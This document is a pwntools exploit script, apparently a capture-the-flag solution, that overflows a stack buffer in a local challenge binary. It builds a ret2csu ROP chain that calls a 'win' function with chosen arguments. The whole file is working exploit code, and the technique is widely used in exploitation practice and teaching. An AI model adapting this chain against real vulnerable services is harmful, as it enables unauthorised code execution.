#!/usr/bin/env python3

from pwn import *

#context.log_level = "debug"
elf = ELF("./task_patched", checksec=False)
context.binary = elf

libc = ELF("./libc.so.6", checksec=False)
ld = ELF("./ld-linux-x86-64.so.2", checksec=False)

#p = elf.process()
#p = elf.debug(gdbscript="")
p = remote("127.0.0.1", 9001)

BSS = 0x404900
POP = 0x401252
CALL = 0x00401238

rop = ROP(elf)
rop.raw(b"A" * 0x28)
rop.gets(BSS)
rop.raw(POP)
rop.raw(0)           # POP RBX
rop.raw(0)           # POP RBP
rop.raw(0xabcdabcd)  # POP R12 => R12D => EDI => a
rop.raw(0xfeeffeef)  # POP R13 => RSI => b
rop.raw(0x12344321)  # POP R14 => RDX => c
rop.raw(BSS)         # POP R15
rop.raw(CALL)		 # CALL [R15 + RBX*8]

p.sendline(rop.chain())
p.sendline(p64(elf.sym["win"]))

p.interactive()
